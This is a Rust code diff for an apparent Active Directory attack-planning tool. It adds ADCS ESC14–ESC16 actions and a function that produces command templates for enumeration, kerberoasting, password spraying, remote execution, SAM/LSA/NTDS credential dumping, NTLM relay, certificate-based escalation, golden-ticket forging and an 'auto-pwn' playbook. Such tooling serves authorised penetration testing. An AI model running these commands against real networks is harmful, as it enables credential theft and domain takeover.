@@ -217,6 +217,18 @@ pub enum PlannedAction {
         ca: String,
         target_upn: String,
     },
+    AdcsEsc14,
+    AdcsEsc15 {
+        template: String,
+        ca: String,
+        target_upn: String,
+    },
+    AdcsEsc16 {
+        template: String,
+        ca: String,
+        victim: String,
+        target_upn: String,
+    },
 
     // ── Persistence ──
     ForgeGoldenTicket {
@@ -290,11 +302,256 @@ impl PlannedAction {
             Self::AdcsEsc11 { .. } => "adcs_esc11",
             Self::AdcsEsc12 { .. } => "adcs_esc12",
             Self::AdcsEsc13 { .. } => "adcs_esc13",
+            Self::AdcsEsc14 => "adcs_esc14",
+            Self::AdcsEsc15 { .. } => "adcs_esc15",
+            Self::AdcsEsc16 { .. } => "adcs_esc16",
             Self::ForgeGoldenTicket { .. } => "forge_golden_ticket",
             Self::ForgeSilverTicket { .. } => "forge_silver_ticket",
             Self::RunPlaybook { .. } => "run_playbook",
             Self::Sleep { .. } => "sleep",
             Self::Checkpoint { .. } => "checkpoint",
+        }
+    }
+
+    pub fn ovt_command_hints(&self) -> Vec<String> {
+        match self {
+            Self::EnumerateUsers => vec![
+                "ovt enum users -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt powerview users -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::EnumerateComputers => vec![
+                "ovt enum computers -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt powerview computers -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::EnumerateGroups => vec![
+                "ovt enum groups -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt powerview groups -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::EnumerateTrusts => vec![
+                "ovt enum trusts -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt powerview trusts -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt move trusts -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::EnumerateGpos => vec![
+                "ovt enum gpos -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt gpo enum -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::EnumeratePasswordPolicy => vec![
+                "ovt enum policy -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt powerview policy -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::EnumerateDelegations => vec![
+                "ovt enum delegations -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt powerview delegations -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::EnumerateLaps => vec![
+                "ovt enum laps -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt laps -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::EnumerateShares { target } => vec![
+                format!("ovt smb shares --target {target} -d <domain> -u <user> -p <pass>"),
+                "ovt snaffler -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::CheckAdminAccess { targets } => vec![format!(
+                "ovt smb admin --targets {} -d <domain> -u <user> -p <pass>",
+                targets.join(",")
+            )],
+            Self::UserEnum { wordlist } => vec![format!(
+                "ovt kerberos user-enum -H <dc> -d <domain> --userlist {wordlist}"
+            )],
+            Self::RidCycle { start_rid, end_rid } => vec![format!(
+                "ovt rid -H <dc> -d <domain> --start-rid {start_rid} --end-rid {end_rid}"
+            )],
+            Self::StealthLdapProbe => {
+                vec![
+                    "ovt enum anonymous -H <dc>".to_string(),
+                    "ovt enum pre -H <dc>".to_string(),
+                ]
+            }
+            Self::StealthDelegationProbe => {
+                vec!["ovt enum delegations -H <dc> -d <domain> -u <user> -p <pass>".to_string()]
+            }
+            Self::AsRepRoast { .. } => vec![
+                "ovt enum asrep -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt kerberos asrep-roast -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::Kerberoast { .. } => vec![
+                "ovt enum spns -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt kerberos roast -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+            ],
+            Self::ConstrainedDelegation {
+                account,
+                target_spn,
+                impersonate,
+            } => vec![
+                "ovt enum delegations -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                "ovt move escalation -H <dc> -d <domain> -u <user> -p <pass>".to_string(),
+                format!(
+                    "planned constrained delegation: account={account}, spn={target_spn}, impersonate={impersonate}"
+                ),
+            ],
+            Self::UnconstrainedDelegation { target_host } => vec![format!(
+                "ovt enum delegations -H <dc> -d <domain> -u <user> -p <pass>; validate unconstrained host {target_host}"
+            )],
+            Self::RbcdAttack { controlled, target } => vec![format!(
+                "ovt enum delegations -H <dc> -d <domain> -u <user> -p <pass>; validate RBCD controlled={controlled} target={target}"
+            )],
+            Self::PasswordSpray { .. } => {
+                vec!["ovt spray -U users.txt --password <password> -H <dc> -d <domain>".to_string()]
+            }
+            Self::CrackHashes { .. } => {
+                vec!["ovt crack --file hashes.txt --mode default".to_string()]
+            }
+            Self::ExecCommand {
+                target,
+                command,
+                method,
+            } => vec![format!(
+                "ovt exec --method {method} --target {target} --command \"{}\" -d <domain> -u <user> -p <pass>",
+                command.replace('"', "\\\"")
+            )],
+            Self::PsExec { target, command } => vec![format!(
+                "ovt exec --method psexec --target {target} --command \"{}\" -d <domain> -u <user> -p <pass>",
+                command.replace('"', "\\\"")
+            )],
+            Self::SmbExec { target, command } => vec![format!(
+                "ovt exec --method smbexec --target {target} --command \"{}\" -d <domain> -u <user> -p <pass>",
+                command.replace('"', "\\\"")
+            )],
+            Self::WmiExec { target, command } => vec![format!(
+                "ovt exec --method wmiexec --target {target} --command \"{}\" -d <domain> -u <user> -p <pass>",
+                command.replace('"', "\\\"")
+            )],
+            Self::WinRmExec { target, command } => vec![format!(
+                "ovt exec --method winrm --target {target} --command \"{}\" -d <domain> -u <user> -p <pass>",
+                command.replace('"', "\\\"")
+            )],
+            Self::DumpSam { target } => vec![format!(
+                "ovt dump --target {target} sam -d <domain> -u <user> -p <pass>"
+            )],
+            Self::DumpLsa { target } => vec![format!(
+                "ovt dump --target {target} lsa -d <domain> -u <user> -p <pass>"
+            )],
+            Self::DumpNtds { target } => vec![format!(
+                "ovt dump --target {target} ntds -d <domain> -u <user> -p <pass>"
+            )],
+            Self::DumpDcc2 { target } => vec![format!(
+                "ovt dump --target {target} dcc2 -d <domain> -u <user> -p <pass>"
+            )],
+            Self::DcsSync { target_user } => vec![format!(
+                "ovt dump --target {} ntds -d <domain> -u <user> -p <pass>",
+                target_user.as_deref().unwrap_or("<dc>")
+            )],
+            Self::Coerce { target, listener } => vec![format!(
+                "ovt ntlm relay --targets {listener}:445 --command \"whoami\"; coerce target {target}"
+            )],
+            Self::AdcsEnumerate => {
+                vec!["ovt adcs enum -H <dc> -d <domain> -u <user> -p <pass>".to_string()]
+            }
+            Self::AdcsEsc1 {
+                template,
+                ca,
+                target_upn,
+            } => vec![format!(
+                "ovt adcs esc1 --template {template} --ca {ca} --target-user {target_upn} -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc2 { template, ca } => vec![format!(
+                "ovt adcs esc2 --template {template} --ca {ca} -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc3 {
+                agent_template,
+                target_template,
+                ca,
+                target_upn,
+            } => vec![format!(
+                "ovt adcs esc3 --agent-template {agent_template} --target-template {target_template} --ca {ca} --target-user {target_upn} -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc4 { template } => vec![format!(
+                "ovt adcs esc4 --template {template} --ca <ca> -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc5 { ca } => vec![format!(
+                "ovt adcs esc5 --ca {ca} -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc6 {
+                template,
+                ca,
+                target_upn,
+            } => vec![format!(
+                "ovt adcs esc6 --ca {ca} --target-user {target_upn} -H <dc> -d <domain> -u <user> -p <pass>; template hint: {template}"
+            )],
+            Self::AdcsEsc7 { ca } => vec![format!(
+                "ovt adcs esc7 --ca {ca} -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc8 {
+                ca,
+                template,
+                target_upn,
+            } => vec![format!(
+                "ovt adcs esc8 --url {ca} --target-user {target_upn} -H <dc> -d <domain> -u <user> -p <pass>; template hint: {template}"
+            )],
+            Self::AdcsEsc9 {
+                template,
+                ca,
+                victim,
+                target_upn,
+            } => vec![format!(
+                "ovt adcs esc9 --template {template} --ca {ca} --victim {victim} --target-upn {target_upn} --original-upn <victim-original-upn> -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc10 {
+                template,
+                ca,
+                victim,
+                target_upn,
+                variant,
+            } => vec![format!(
+                "ovt adcs esc10 --template {template} --ca {ca} --target-upn {target_upn} --variant {variant} --victim {victim} --original-upn <victim-original-upn> -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc11 {
+                ca,
+                template,
+                target_upn,
+            } => vec![format!(
+                "ovt adcs esc11 --ca-host {ca} --ca-name <ca-name> --template {template} -H <dc> -d <domain> -u <user> -p <pass>; target hint: {target_upn}"
+            )],
+            Self::AdcsEsc12 { ca_host, ca_name } => vec![format!(
+                "ovt adcs esc12 --ca-host {ca_host} --ca-name {ca_name} -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc13 {
+                template,
+                ca,
+                target_upn,
+            } => vec![format!(
+                "ovt adcs esc13 --template {template} --ca {ca} --policy-oid <oid> --linked-group-dn <group-dn> --subject {target_upn} -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::AdcsEsc14 => vec!["ovt adcs esc14".to_string()],
+            Self::AdcsEsc15 {
+                template,
+                ca,
+                target_upn,
+            } => vec![format!(
+                "ovt adcs esc15 --ca {ca} --template {template} --target-user {}",
+                target_upn.split('@').next().unwrap_or(target_upn)
+            )],
+            Self::AdcsEsc16 {
+                template,
+                ca,
+                victim,
+                target_upn,
+            } => vec![format!(
+                "ovt adcs esc16 --ca {ca} --template {template} --target-upn {target_upn} --victim {victim} --original-upn <victim-original-upn> --ldap-url ldap://<dc>"
+            )],
+            Self::ForgeGoldenTicket { .. } => vec![
+                "ovt forge golden --domain-sid <sid> --krbtgt-hash <hash> --user Administrator"
+                    .to_string(),
+            ],
+            Self::ForgeSilverTicket { spn, .. } => vec![format!(
+                "ovt forge silver --domain-sid <sid> --spn {spn} --service-hash <hash>"
+            )],
+            Self::RunPlaybook { playbook_id } => vec![format!(
+                "ovt auto-pwn --playbook {playbook_id:?} -H <dc> -d <domain> -u <user> -p <pass>"
+            )],
+            Self::Sleep { seconds } => vec![format!("sleep {seconds}")],
+            Self::Checkpoint { message } => vec![format!("checkpoint: {message}")],
         }
     }
 }
@@ -932,6 +1189,36 @@ impl Planner {
                         target_upn: String::new(),
                     },
                     73,
+                    NoiseLevel::Low,
+                ),
+                (
+                    "adcs_esc14",
+                    "ADCS ESC14 - certificate mapping / altSecurityIdentities guidance",
+                    PlannedAction::AdcsEsc14,
+                    72,
+                    NoiseLevel::Silent,
+                ),
+                (
+                    "adcs_esc15",
+                    "ADCS ESC15 - schema v1 enrollee-supplied subject abuse",
+                    PlannedAction::AdcsEsc15 {
+                        template: String::new(),
+                        ca: String::new(),
+                        target_upn: String::new(),
+                    },
+                    71,
+                    NoiseLevel::Low,
+                ),
+                (
+                    "adcs_esc16",
+                    "ADCS ESC16 - CA security extension disablement path",
+                    PlannedAction::AdcsEsc16 {
+                        template: String::new(),
+                        ca: String::new(),
+                        victim: String::new(),
+                        target_upn: String::new(),
+                    },
+                    70,
                     NoiseLevel::Low,
                 ),
             ];
